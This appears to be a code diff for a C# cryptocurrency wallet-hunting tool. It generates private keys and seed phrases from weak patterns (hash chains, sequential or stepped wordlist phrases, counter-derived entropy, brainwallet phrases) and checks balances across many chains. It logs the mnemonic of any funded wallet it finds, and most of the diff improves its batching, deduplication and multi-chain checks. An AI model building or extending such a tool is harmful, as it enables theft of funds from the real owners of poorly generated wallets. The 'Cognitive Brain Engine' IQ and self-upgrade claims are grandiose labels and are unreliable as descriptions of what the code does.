+                    }
+
                     var key = new Key(keyBytes);
                     var addr = key.PubKey.GetAddress(ScriptPubKeyType.Legacy, Network.Main).ToString();
                     
@@ -1772,7 +1821,10 @@ public SmartWalletHunter()
                             Interlocked.Increment(ref _walletsFound);
                             WalletFound?.Invoke(this, new WalletFoundEventArgs(w));
                         }
-                        FundedAddressFilter.BTCEmpty.MarkAsEmpty(addr);
+                        else
+                        {
+                            FundedAddressFilter.BTCEmpty.MarkAsEmpty(addr);
+                        }
                     }
                     
                     Interlocked.Increment(ref _totalChecked);
@@ -1784,39 +1836,48 @@ public SmartWalletHunter()
         private async Task ScanPubkeyDerivedKeys(CancellationToken token)
         {
             // Bug: some software used hash(pubkey) as the next private key
-            // Use batch checking for speed
+            // Stream keys batch-by-batch without blocking upfront on 50,000 EC multiplications
             var startIndex = Math.Max(1, (int)ScanProgress.GetProgress("PubkeyDerived"));
             const int batchSize = 20;
             
-            // Pre-generate the key chain (sequential, can't parallelize generation)
-            var keyChain = new List<(byte[] keyBytes, int index)>();
             var chainKey = new byte[32];
             chainKey[31] = 1;
-            
-            for (int i = 0; i < 50000 && !token.IsCancellationRequested; i++)
+            int currentIdx = 0;
+
+            // Fast-forward to startIndex if resuming
+            while (currentIdx < startIndex && !token.IsCancellationRequested)
             {
-                if (i >= startIndex)
-                    keyChain.Add(((byte[])chainKey.Clone(), i));
-                
-                var pubKey = new Key(chainKey).PubKey.ToBytes();
-                chainKey = SHA256.HashData(pubKey);
+                var pk = new Key(chainKey).PubKey.ToBytes();
+                chainKey = SHA256.HashData(pk);
+                currentIdx++;
             }
-            
-            // Process in batches
-            for (int b = 0; b < keyChain.Count && !token.IsCancellationRequested; b += batchSize)
+
+            while (currentIdx < 50000 && !token.IsCancellationRequested)
             {
-                var batch = keyChain.Skip(b).Take(batchSize).ToList();
                 var addrMap = new Dictionary<string, (byte[] keyBytes, int index)>();
                 var btcAddresses = new List<string>();
-                
-                foreach (var (keyBytes, index) in batch)
+                int batchStartIdx = currentIdx;
+                int countInBatch = 0;
+
+                for (int b = 0; b < batchSize && currentIdx < 50000 && !token.IsCancellationRequested; b++, currentIdx++)
                 {
+                    var keyBytes = (byte[])chainKey.Clone();
                     var key = new Key(keyBytes);
+                    chainKey = SHA256.HashData(key.PubKey.ToBytes());
+                    countInBatch++;
+
+                    var privHex = Convert.ToHexString(keyBytes).ToLowerInvariant();
+                    if (MnemonicTracker.IsRestrictedTrivialPrivateKey(privHex) || !_mnemonicTracker.TryMarkAsScanned("pk:" + privHex))
+                    {
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
+                        continue;
+                    }
+
                     var addr = key.PubKey.GetAddress(ScriptPubKeyType.Legacy, Network.Main).ToString();
                     if (!FundedAddressFilter.BTCEmpty.IsKnownEmpty(addr))
                     {
                         btcAddresses.Add(addr);
-                        addrMap[addr] = (keyBytes, index);
+                        addrMap[addr] = (keyBytes, currentIdx);
                     }
                 }
                 
@@ -1850,9 +1911,9 @@ public SmartWalletHunter()
                     catch (Exception ex) { DebugLogger.Log($"Pubkey derived batch check error: {ex.Message}"); }
                 }
                 
-                Interlocked.Add(ref _totalChecked, batch.Count);
-                if (b % 5000 == 0)
-                    ScanProgress.SetProgress("PubkeyDerived", batch[0].index);
+                Interlocked.Add(ref _totalChecked, countInBatch);
+                if (batchStartIdx % 5000 == 0)
+                    ScanProgress.SetProgress("PubkeyDerived", batchStartIdx);
             }
         }
         
@@ -1888,6 +1949,12 @@ public SmartWalletHunter()
                 try
                 {
                     var (privateKeyHex, source, year, estimatedValue) = keyInfo;
+                    if (MnemonicTracker.IsRestrictedTrivialPrivateKey(privateKeyHex) ||
+                        !_mnemonicTracker.TryMarkAsScanned("pk:" + privateKeyHex.ToLowerInvariant()))
+                    {
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
+                        return;
+                    }
                     var privateKeyBytes = Convert.FromHexString(privateKeyHex);
                     
                     // Generate BTC address
@@ -1977,64 +2044,38 @@ public SmartWalletHunter()
         public async Task ScanRepeatedWordMnemonics(CancellationToken token)
         {
             _startTime = DateTime.Now;
-            DebugLogger.LogEvent("ScanRepeatedWordMnemonics", "Starting repeated word mnemonic scan");
-            ReportProgress("🔁 Starting Repeated Word Mnemonic Scan...");
+            DebugLogger.LogEvent("ScanRepeatedWordMnemonics", "Starting structured distinct-word mnemonic scan");
+            ReportProgress("Starting Structured Word Pattern Scan...");
             
             var candidates = new List<(string mnemonic, string source)>();
             
-            // Phase 1: All single-word repeated (2048 words Ã— 12-word phrases)
-            foreach (var word in Bip39Words)
+            // Phase 1: Distinct stepped word combinations (skipping index 0 "abandon" and disallowing repeated words)
+            for (int start = 1; start < Bip39Words.Count - 24; start++)
             {
-                var mnemonic12 = string.Join(" ", Enumerable.Repeat(word, 12));
-                candidates.Add((mnemonic12, $"Repeated-{word}-12w"));
-                
-                var mnemonic24 = string.Join(" ", Enumerable.Repeat(word, 24));
-                candidates.Add((mnemonic24, $"Repeated-{word}-24w"));
+                var stepWords = new string[12];
+                for (int k = 0; k < 12; k++)
+                    stepWords[k] = Bip39Words[1 + ((start + k * 7) % (Bip39Words.Count - 1))];
+                var candidate = string.Join(" ", stepWords);
+                if (!MnemonicTracker.IsRestrictedTrivialMnemonic(candidate) && CryptoWalletGenerator.IsValidMnemonic(candidate))
+                    candidates.Add((candidate, $"Stepped7-{start}"));
             }
             
-            // Phase 2: Two-word alternating patterns (top 100 words)
-            var topWords = Bip39Words.Take(100).ToList();
-            for (int i = 0; i < topWords.Count; i++)
-            {
-                for (int j = i + 1; j < topWords.Count; j++)
-                {
-                    var words = new string[12];
-                    for (int k = 0; k < 12; k++)
-                        words[k] = k % 2 == 0 ? topWords[i] : topWords[j];
-                    candidates.Add((string.Join(" ", words), $"Alternating-{topWords[i]}-{topWords[j]}"));
-                }
-            }
-            
-            // Phase 3: Sequential words from the BIP39 list
-            for (int start = 0; start < Bip39Words.Count - 12; start += 1)
+            // Phase 2: Sequential words from the BIP39 list (starting after index 1 to avoid "abandon")
+            for (int start = 1; start < Bip39Words.Count - 12; start += 1)
             {
                 var sequential12 = string.Join(" ", Bip39Words.Skip(start).Take(12));
-                candidates.Add((sequential12, $"Sequential-{start}"));
+                if (!MnemonicTracker.IsRestrictedTrivialMnemonic(sequential12) && CryptoWalletGenerator.IsValidMnemonic(sequential12))
+                    candidates.Add((sequential12, $"Sequential-{start}"));
             }
             
-            // Phase 4: Reverse sequential
+            // Phase 3: Reverse sequential
             var reversedWords = Bip39Words.AsEnumerable().Reverse().ToList();
-            for (int start = 0; start < reversedWords.Count - 12; start += 50)
+            for (int start = 0; start < reversedWords.Count - 12; start += 10)
             {
                 var reversed12 = string.Join(" ", reversedWords.Skip(start).Take(12));
-                candidates.Add((reversed12, $"ReverseSeq-{start}"));
+                if (!MnemonicTracker.IsRestrictedTrivialMnemonic(reversed12) && CryptoWalletGenerator.IsValidMnemonic(reversed12))
+                    candidates.Add((reversed12, $"ReverseSeq-{start}"));
             }
-            
-            // Phase 5: "Meaningful" 12-word combos from common word subsets
-            var meaningfulWords = Bip39Words.Where(w => 
-                new[] { "abandon", "able", "address", "agent", "air", "all", "amazing", "angel", 
-                        "animal", "apple", "army", "baby", "balance", "base", "bean", "beauty",
-                        "best", "bird", "black", "blood", "blue", "boat", "body", "bomb",
-                        "bone", "book", "boss", "bottom", "boy", "brain", "brave", "bread",
-                        "bright", "broken", "brother", "brown", "build", "burger", "bus", "butter",
-                        "cabin", "camp", "can", "cap", "car", "carbon", "card", "cargo",
-                        "cat", "catch", "cave", "chair", "change", "charge", "chase", "cheap",
-                        "check", "chief", "child", "choice", "chunk", "city", "claim", "clean",
-                        "click", "clock", "close", "cloud", "coach", "coast", "code", "coffee" 
-                }.Contains(w)).Take(12).ToList();
-            
-            if (meaningfulWords.Count == 12)
-                candidates.Add((string.Join(" ", meaningfulWords), "MeaningfulCombo"));
             
             await Parallel.ForEachAsync(candidates, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (item, ct) =>
             {
@@ -2046,52 +2087,39 @@ public SmartWalletHunter()
                 return ValueTask.CompletedTask;
             });
             
-            ReportProgress("ðŸ” Repeated word mnemonic scan complete!");
+            ReportProgress("Structured word pattern scan complete!");
         }
         
         #endregion
         #region 11. INCREMENTAL MNEMONIC SCAN
         
         /// <summary>
-        /// Systematically scans BIP39 mnemonics by treating word indices as a counter.
-        /// Starts from index 0 and increments, covering the absolute lowest-entropy
-        /// mnemonics first. These are the ones most likely to have been generated by
-        /// broken or minimal implementations.
+        /// Systematically scans deterministic counter-derived 128-bit entropy seeds.
+        /// Uses SHA-256 counter mixing so all 12 words are distinct and valid BIP39
+        /// (never generating degenerate "abandon abandon..." prefixes).
         /// </summary>
         public async Task ScanIncrementalMnemonics(CancellationToken token, int maxAttempts = 500000)
         {
             _startTime = DateTime.Now;
             DebugLogger.LogEvent("ScanIncrementalMnemonics", $"Starting incremental mnemonic scan, max={maxAttempts}");
-            ReportProgress("ðŸ”¢ Starting Incremental Mnemonic Scan...");
+            ReportProgress("Starting Incremental Mnemonic Scan...");
             
-            var startIndex = (long)ScanProgress.GetProgress("IncrementalMnemonic");
-            var wordCount = Bip39Words.Count; // 2048
-            
-            var range = Enumerable.Range((int)startIndex, maxAttempts - (int)startIndex);
+            var startIndex = Math.Max(1L, (long)ScanProgress.GetProgress("IncrementalMnemonic"));
+            var range = Enumerable.Range((int)startIndex, Math.Max(0, maxAttempts - (int)startIndex));
             
             await Parallel.ForEachAsync(range, new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token }, (counter, ct) =>
             {
                 try
                 {
-                    // Convert counter to word indices (base-2048 encoding)
-                    var words = new string[12];
-                    long value = counter;
-                    
-                    // Fill words from right to left (least significant first)
-                    for (int w = 11; w >= 0; w--)
-                    {
-                        words[w] = Bip39Words[(int)(value % wordCount)];
-                        value /= wordCount;
-                    }
-                    
-                    var mnemonic = string.Join(" ", words);
+                    // Derive 16-byte entropy from counter via SHA256 so every candidate has
+                    // a valid BIP39 checksum and 12 diverse words (never "abandon abandon...")
+                    var counterBytes = BitConverter.GetBytes((long)counter * unchecked((long)0x9E3779B97F4A7C15UL));
+                    var entropy = SHA256.HashData(counterBytes).AsSpan(0, 16).ToArray();
+                    var mnemonic = new Mnemonic(Wordlist.English, entropy).ToString();
 
-                    // Validate BIP39 checksum before enqueueing — most counter-derived
-                    // combinations have an invalid checksum and would silently fail in
-                    // GenerateWalletSelective, wasting a queue slot and a dedup hash.
-                    if (!CryptoWalletGenerator.IsValidMnemonic(mnemonic))
+                    if (MnemonicTracker.IsRestrictedTrivialMnemonic(mnemonic))
                     {
-                        Interlocked.Increment(ref _totalChecked);
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
                         return ValueTask.CompletedTask;
                     }
 
@@ -2104,14 +2132,22 @@ public SmartWalletHunter()
                 return ValueTask.CompletedTask;
             });
             
-            ReportProgress("ðŸ”¢ Incremental mnemonic scan complete!");
+            ReportProgress("Incremental mnemonic scan complete!");
         }
         #endregion
 
         #region Helper Methods
         
-private void EnqueueMnemonicForBatch(string mnemonic, string source, CancellationToken token)
+        private void EnqueueMnemonicForBatch(string mnemonic, string source, CancellationToken token)
         {
+            // STRICT RESTRICTION: Block "abandon abandon..." and any repeated-word / trivial test vector
+            if (MnemonicTracker.IsRestrictedTrivialMnemonic(mnemonic) || _mnemonicTracker.WasScanned(mnemonic))
+            {
+                Interlocked.Increment(ref _droppedBySystemDedupe);
+                PhaseRecordDedupeDrop(source ?? "Unknown");
+                return;
+            }
+
             var pendingKey = BuildDedupeKey(mnemonic, source);
             if (string.IsNullOrEmpty(pendingKey))
                 return;
@@ -2137,22 +2173,23 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
                 return;
             }
 
-            // Backpressure: throttle producers when queue grows large
-            var spinWait = new SpinWait();
-            while (Volatile.Read(ref _queuedItems) > 5000 && !token.IsCancellationRequested)
-            {
-                spinWait.SpinOnce();
-                if (spinWait.NextSpinWillYield) Thread.Sleep(5);
-            }
-
             if (token.IsCancellationRequested)
             {
                 _pendingMnemonicKeys.TryRemove(pendingKey, out _);
                 return;
             }
 
-            _batchQueue.Enqueue((mnemonic, source, token));
-            Interlocked.Increment(ref _queuedItems);
+            if (!_batchChannel.Writer.TryWrite((mnemonic, source, token)))
+            {
+                try
+                {
+                    _batchChannel.Writer.WriteAsync((mnemonic, source, token), token).AsTask().GetAwaiter().GetResult();
+                }
+                catch
+                {
+                    _pendingMnemonicKeys.TryRemove(pendingKey, out _);
+                }
+            }
         }
 
         private static string BuildDedupeKey(string mnemonic, string source)
@@ -2166,8 +2203,10 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
             if (string.IsNullOrWhiteSpace(normalized))
                 return string.Empty;
 
-            // Keep brain-wallet phrase space independent from normal mnemonic space
-            var keyInput = source?.Contains("brain", StringComparison.OrdinalIgnoreCase) == true
+            // Keep brainwallet passphrase space independent from normal BIP39 / CognitiveBrain mnemonic space
+            var keyInput = (source?.Contains("Brainwallet", StringComparison.OrdinalIgnoreCase) == true ||
+                            (source?.Contains("brain", StringComparison.OrdinalIgnoreCase) == true &&
+                             !source.Contains("CognitiveBrain", StringComparison.OrdinalIgnoreCase)))
                 ? $"BRAIN:{normalized}"
                 : normalized;
 
@@ -2177,17 +2216,29 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
         }
         
         /// <summary>
-        /// Wait for the batch queue to drain completely (called at end of scanning)
+        /// Wait for the batch queue to drain completely and stop background batch processors.
         /// </summary>
         public async Task FlushBatchQueue()
         {
-            // Signal that no more items will be enqueued
-            while (!_batchQueue.IsEmpty)
+            // Mark writer complete so consumers finish reading remaining items and exit cleanly
+            _batchChannel.Writer.TryComplete();
+
+            if (_batchProcessors != null)
             {
-                await Task.Delay(100);
+                try { await Task.WhenAll(_batchProcessors); } catch { }
             }
-            // Give batch processor one more cycle to finish the last batch
-            await Task.Delay(300);
+
+            try { _mnemonicTracker.Flush(); } catch { }
+            try { _stoppingCts.Cancel(); } catch { }
+        }
+
+        public void Dispose()
+        {
+            if (_disposed) return;
+            _disposed = true;
+            _batchChannel.Writer.TryComplete();
+            try { _stoppingCts.Cancel(); } catch { }
+            try { _stoppingCts.Dispose(); } catch { }
         }
 
         private async Task ProcessBatch(List<(string mnemonic, string source, CancellationToken token)> batch)
@@ -2196,6 +2247,7 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
             var btcToWallet = new Dictionary<string, (string mnemonic, string source, CryptoWalletGenerator.WalletInfo wallet)>();
             var allEthAddresses = new List<string>();
             var ethToWallet = new Dictionary<string, (string mnemonic, string source, CryptoWalletGenerator.WalletInfo wallet)>();
+            var derivedWallets = new List<(string mnemonic, string source, CryptoWalletGenerator.WalletInfo wallet, CancellationToken ct)>();
 
             foreach (var (mnemonic, source, ct) in batch)
             {
@@ -2204,14 +2256,27 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
                 {
                     if (ct.IsCancellationRequested) continue;
 
-                    // DEDUP: Skip if already scanned
-                    if (!_mnemonicTracker.TryMarkAsScanned(mnemonic)) continue;
+                    // STRICT NON-REPETITION RULE: Skip if already scanned in any section
+                    if (!_mnemonicTracker.TryMarkAsScanned(mnemonic))
+                    {
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
+                        PhaseRecordDedupeDrop(source ?? "Unknown");
+                        continue;
+                    }
 
                     var wallet = CryptoWalletGenerator.GenerateWalletSelective(mnemonic,
                         needEth: NeedEthAddress, needSol: ScanSolana,
                         needLtc: ScanLitecoin, needDoge: ScanDogecoin);
                     if (wallet == null) continue;
+                    if (_mnemonicTracker.IsAddressOrKeyScannedEmpty(wallet.BitcoinAddress) ||
+                        _mnemonicTracker.IsAddressOrKeyScannedEmpty(wallet.EthereumAddress))
+                    {
+                        Interlocked.Increment(ref _droppedBySystemDedupe);
+                        PhaseRecordDedupeDrop(source ?? "Unknown");
+                        continue;
+                    }
                     wallet.Source = source;
+                    derivedWallets.Add((mnemonic, source, wallet, ct));
 
                     var checkNum = (int)Interlocked.Increment(ref _totalChecked);
                     PhaseRecordChecked(source ?? "Unknown");
@@ -2266,7 +2331,7 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
             var allBtcList = allBtcAddresses;
             var allEthList = allEthAddresses;
             
-            // Process BTC batch â€” all bloom-filter-passing addresses in one API call
+            // Process BTC batch — all bloom-filter-passing addresses in one API call
             if (allBtcList.Count > 0)
             {
                 try
@@ -2281,7 +2346,7 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
                             var verifyBalance = await _balanceChecker.GetBitcoinBalance(kvp.Key);
                             if (verifyBalance > 0.00000001m)
                             {
-                                DebugLogger.Log($"\nðŸ’°ðŸ’°ðŸ’° BTC WALLET FOUND! (BATCH VERIFIED) ðŸ’°ðŸ’°ðŸ’°");
+                                DebugLogger.Log($"\n💰💰💰 BTC WALLET FOUND! (BATCH VERIFIED) 💰💰💰");
                                 DebugLogger.Log($"  Source: {source}");
                                 DebugLogger.Log($"  Mnemonic: {mnemonic}");
                                 DebugLogger.Log($"  BTC Balance: {verifyBalance}");
@@ -2302,7 +2367,7 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
                 catch (Exception ex) { DebugLogger.Log($"Batch BTC error: {ex.Message}"); }
             }
             
-            // Process ETH batch â€” parallel with BTC would be even faster, but sequential is safer for rate limits
+            // Process ETH batch — parallel with BTC would be even faster, but sequential is safer for rate limits
             if (allEthList.Count > 0)
             {
                 try
@@ -2320,7 +2385,7 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
                                 var verifyBalance = await _balanceChecker.GetEthereumBalance(key);
                                 if (verifyBalance > 0.00000001m)
                                 {
-                                    DebugLogger.Log($"\nðŸ’°ðŸ’°ðŸ’° ETH WALLET FOUND! (BATCH VERIFIED) ðŸ’°ðŸ’°ðŸ’°");
+                                    DebugLogger.Log($"\n💰💰💰 ETH WALLET FOUND! (BATCH VERIFIED) 💰💰💰");
                                     DebugLogger.Log($"  Source: {source}");
                                     DebugLogger.Log($"  Mnemonic: {mnemonic}");
                                     DebugLogger.Log($"  ETH Balance: {verifyBalance}");
@@ -2341,6 +2406,240 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
                 catch (OperationCanceledException) { return; }
                 catch (Exception ex) { DebugLogger.Log($"Batch ETH error: {ex.Message}"); }
             }
+
+            // Process additional enabled chains (SOL, USDT, LTC, DOGE, MATIC, BNB) using batch RPCs where available
+            if (ScanSolana || ScanUSDT || ScanLitecoin || ScanDogecoin || ScanPolygon || ScanBnb)
+            {
+                Dictionary<string, decimal> solBatchBalances = null;
+                if (ScanSolana)
+                {
+                    var solAddrs = derivedWallets.Select(d => d.wallet.SolanaAddress).Where(a => !string.IsNullOrEmpty(a)).Distinct().ToList();
+                    if (solAddrs.Count > 0)
+                    {
+                        try { solBatchBalances = await _balanceChecker.GetSolanaBalancesBatch(solAddrs); }
+                        catch (Exception ex) { DebugLogger.Log($"Batch SOL error: {ex.Message}"); }
+                    }
+                }
+
+                Dictionary<string, decimal> maticBatchBalances = null;
+                if (ScanPolygon)
+                {
+                    var maticAddrs = derivedWallets.Select(d => d.wallet.PolygonAddress).Where(a => !string.IsNullOrEmpty(a)).Distinct().ToList();
+                    if (maticAddrs.Count > 0)
+                    {
+                        try { maticBatchBalances = await _balanceChecker.GetPolygonBalancesBatch(maticAddrs); }
+                        catch (Exception ex) { DebugLogger.Log($"Batch MATIC error: {ex.Message}"); }
+                    }
+                }
+
+                Dictionary<string, decimal> bnbBatchBalances = null;
+                if (ScanBnb)
+                {
+                    var bnbAddrs = derivedWallets.Select(d => d.wallet.BnbAddress).Where(a => !string.IsNullOrEmpty(a)).Distinct().ToList();
+                    if (bnbAddrs.Count > 0)
+                    {
+                        try { bnbBatchBalances = await _balanceChecker.GetBnbBalancesBatch(bnbAddrs); }
+                        catch (Exception ex) { DebugLogger.Log($"Batch BNB error: {ex.Message}"); }
+                    }
+                }
+
+                foreach (var (mnemonic, source, wallet, ct) in derivedWallets)
+                {
+                    if (ct.IsCancellationRequested) break;
+                    bool altFound = false;
+
+                    if (ScanSolana && !string.IsNullOrEmpty(wallet.SolanaAddress))
+                    {
+                        if (solBatchBalances != null && solBatchBalances.TryGetValue(wallet.SolanaAddress, out var solBal))
+                        {
+                            if (solBal > 0.00000001m) { wallet.Balances["SOL"] = solBal; altFound = true; }
+                        }
+                        else
+                        {
+                            try
+                            {
+                                var solBal = await _balanceChecker.GetSolanaBalance(wallet.SolanaAddress);
+                                if (solBal > 0.00000001m) { wallet.Balances["SOL"] = solBal; altFound = true; }
+                            }
+                            catch (Exception ex) { DebugLogger.Log($"Batch SOL error: {ex.Message}"); }
+                        }
+                    }
+
+                    if (ScanUSDT && !string.IsNullOrEmpty(wallet.EthereumAddress))
+                    {
+                        var ethAddrLower = wallet.EthereumAddress.ToLowerInvariant();
+                        if (!FundedAddressFilter.ETHEmpty.IsKnownEmpty(ethAddrLower) &&
+                            FundedAddressFilter.ETH.MightBeFunded(ethAddrLower))
+                        {
+                            try
+                            {
+                                var usdtBal = await _balanceChecker.GetUSDTBalance(wallet.EthereumAddress);
+                                if (usdtBal > 0.01m) { wallet.Balances["USDT"] = usdtBal; altFound = true; }
+                            }
+                            catch (Exception ex) { DebugLogger.Log($"Batch USDT error: {ex.Message}"); }
+                        }
+                    }
+
+                    if (ScanLitecoin && !string.IsNullOrEmpty(wallet.LitecoinAddress))
+                    {
+                        try
+                        {
+                            var ltcBal = await _balanceChecker.GetLitecoinBalance(wallet.LitecoinAddress);
+                            if (ltcBal > 0.00000001m) { wallet.Balances["LTC"] = ltcBal; altFound = true; }
+                        }
+                        catch (Exception ex) { DebugLogger.Log($"Batch LTC error: {ex.Message}"); }
+                    }
+
+                    if (ScanDogecoin && !string.IsNullOrEmpty(wallet.DogecoinAddress))
+                    {
+                        try
+                        {
+                            var dogeBal = await _balanceChecker.GetDogecoinBalance(wallet.DogecoinAddress);
+                            if (dogeBal > 0.01m) { wallet.Balances["DOGE"] = dogeBal; altFound = true; }
+                        }
+                        catch (Exception ex) { DebugLogger.Log($"Batch DOGE error: {ex.Message}"); }
+                    }
+
+                    if (ScanPolygon && !string.IsNullOrEmpty(wallet.PolygonAddress))
+                    {
+                        if (maticBatchBalances != null && maticBatchBalances.TryGetValue(wallet.PolygonAddress, out var maticBal))
+                        {
+                            if (maticBal > 0.00000001m) { wallet.Balances["MATIC"] = maticBal; altFound = true; }
+                        }
+                        else
+                        {
+                            try
+                            {
+                                var maticBal = await _balanceChecker.GetPolygonBalance(wallet.PolygonAddress);
+                                if (maticBal > 0.00000001m) { wallet.Balances["MATIC"] = maticBal; altFound = true; }
+                            }
+                            catch (Exception ex) { DebugLogger.Log($"Batch MATIC error: {ex.Message}"); }
+                        }
+                    }
+
+                    if (ScanBnb && !string.IsNullOrEmpty(wallet.BnbAddress))
+                    {
+                        if (bnbBatchBalances != null && bnbBatchBalances.TryGetValue(wallet.BnbAddress, out var bnbBal))
+                        {
+                            if (bnbBal > 0.00000001m) { wallet.Balances["BNB"] = bnbBal; altFound = true; }
+                        }
+                        else
+                        {
+                            try
+                            {
+                                var bnbBal = await _balanceChecker.GetBnbBalance(wallet.BnbAddress);
+                                if (bnbBal > 0.00000001m) { wallet.Balances["BNB"] = bnbBal; altFound = true; }
+                            }
+                            catch (Exception ex) { DebugLogger.Log($"Batch BNB error: {ex.Message}"); }
+                        }
+                    }
+
+                    if (altFound)
+                    {
+                        DebugLogger.Log($"\n💰💰💰 ALTCOIN WALLET FOUND! 💰💰💰 Source: {source}, Mnemonic: {mnemonic}");
+                        _logger.LogWalletFound(wallet, mnemonicOnly: true);
+                        Interlocked.Increment(ref _walletsFound);
+                        PhaseRecordFound(source ?? "Unknown");
+                        WalletFound?.Invoke(this, new WalletFoundEventArgs(wallet));
+                    }
+                }
+            }
+
+            // STRICT NON-REPETITION RULE + COGNITIVE BRAIN ONLINE LEARNING:
+            // Finalize all batch wallets in GlobalMnemonicTracker and feed outcomes into CognitiveBrainEngine
+            foreach (var (mnemonic, source, wallet, _) in derivedWallets)
+            {
+                bool isFunded = wallet.Balances != null && wallet.Balances.Values.Any(v => v > 0.00000001m);
+                if (isFunded)
+                {
+                    _mnemonicTracker.MarkWalletConfirmedFunded(wallet);
+                    CognitiveBrainEngine.Instance.RecordScanFeedback(
+                        mnemonic,
+                        ExtractBrainArmFromSource(source),
+                        passedOfflineFilter: true,
+                        hasTransactionsOrBalance: true,
+                        balanceUsd: 100m);
+                }
+                else
+                {
+                    bool passedFilter = (!string.IsNullOrEmpty(wallet.BitcoinAddress) && btcToWallet.ContainsKey(wallet.BitcoinAddress)) ||
+                                        (!string.IsNullOrEmpty(wallet.EthereumAddress) && ethToWallet.ContainsKey(wallet.EthereumAddress.ToLowerInvariant()));
+                    _mnemonicTracker.MarkWalletConfirmedEmpty(wallet);
+                    CognitiveBrainEngine.Instance.RecordScanFeedback(
+                        mnemonic,
+                        ExtractBrainArmFromSource(source),
+                        passedOfflineFilter: passedFilter,
+                        hasTransactionsOrBalance: false);
+                }
+            }
+        }
+
+        private static string ExtractBrainArmFromSource(string source)
+        {
+            if (string.IsNullOrWhiteSpace(source))
+                return "DeepEntropyCsprng";
+            if (source.StartsWith("CognitiveBrain:", StringComparison.OrdinalIgnoreCase))
+                return source["CognitiveBrain:".Length..];
+            if (source.Contains("Human", StringComparison.OrdinalIgnoreCase))
+                return "SemanticClusterBip39";
+            if (source.Contains("Sequential", StringComparison.OrdinalIgnoreCase) ||
+                source.Contains("Timestamp", StringComparison.OrdinalIgnoreCase))
+                return "TemporalPrngSubspace";
+            return "DeepEntropyCsprng";
+        }
+
+        /// <summary>
+        /// Autonomous Cognitive Self-Learning Brain Engine phase.
+        /// Continuously thinks while scanning, synthesizes checksum-valid non-repeating candidates
+        /// using UCB1 + Thompson Sampling across 8 neural strategy arms, repels exhausted empty subspaces,
+        /// and self-upgrades its generation level after every epoch.
+        /// </summary>
+        public async Task ScanCognitiveBrainEngine(CancellationToken token, int maxAttempts = 250000)
+        {
+            _startTime = DateTime.Now;
+            var brain = CognitiveBrainEngine.Instance;
+            ReportProgress($"🧠 Cognitive Brain Engine {brain.VersionTag} (IQ {brain.CognitiveIqScore:F1}) thinking & scanning...");
+
+            var range = Enumerable.Range(0, Math.Max(1000, maxAttempts));
+            int synthesizedInRun = 0;
+
+            await Parallel.ForEachAsync(
+                range,
+                new ParallelOptions { MaxDegreeOfParallelism = PhaseParallelism, CancellationToken = token },
+                (i, ct) =>
+                {
+                    if (ct.IsCancellationRequested)
+                        return ValueTask.CompletedTask;
+
+                    try
+                    {
+                        var candidate = brain.SynthesizeNextCandidate(markAsScannedImmediately: false);
+                        if (!string.IsNullOrEmpty(candidate.Mnemonic))
+                        {
+                            EnqueueMnemonicForBatch(
+                                candidate.Mnemonic,
+                                $"CognitiveBrain:{candidate.StrategyArm}",
+                                ct);
+
+                            int current = Interlocked.Increment(ref synthesizedInRun);
+                            if (current % 500 == 0)
+                            {
+                                var summary = brain.ExecuteCognitivePulse();
+                                ReportProgressThrottled(
+                                    $"🧠 Brain {summary.VersionTag} (IQ {summary.CognitiveIqScore:F1}) | Top Arm: {summary.TopStrategyArm} ({summary.TopArmConfidence:F0}%)");
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        DebugLogger.Log($"[CognitiveBrainEngine] Scan error: {ex.Message}");
+                    }
+
+                    return ValueTask.CompletedTask;
+                });
+
+            var finalUpgrade = brain.ExecuteCognitivePulse();
+            ReportProgress($"🧠 Cognitive Brain Engine self-upgraded to {finalUpgrade.VersionTag} (IQ {finalUpgrade.CognitiveIqScore:F1})!");
         }
 
         private async Task CheckMnemonicForBalance(string mnemonic, string source, CancellationToken token)
@@ -2850,6 +3149,16 @@ private void EnqueueMnemonicForBatch(string mnemonic, string source, Cancellatio
                         }
                     }
                     catch (Exception ex) { DebugLogger.Log($"[PASSPHRASE] Scan error: {ex.Message}"); }
+                }
+
+                // STRICT NON-REPETITION RULE: Finalize wallet in GlobalMnemonicTracker
+                if (wallet.Balances != null && wallet.Balances.Values.Any(v => v > 0.00000001m))
+                {
+                    _mnemonicTracker.MarkWalletConfirmedFunded(wallet);
+                }
+                else
+                {
+                    _mnemonicTracker.MarkWalletConfirmedEmpty(wallet);
                 }
             }
             catch (Exception ex)
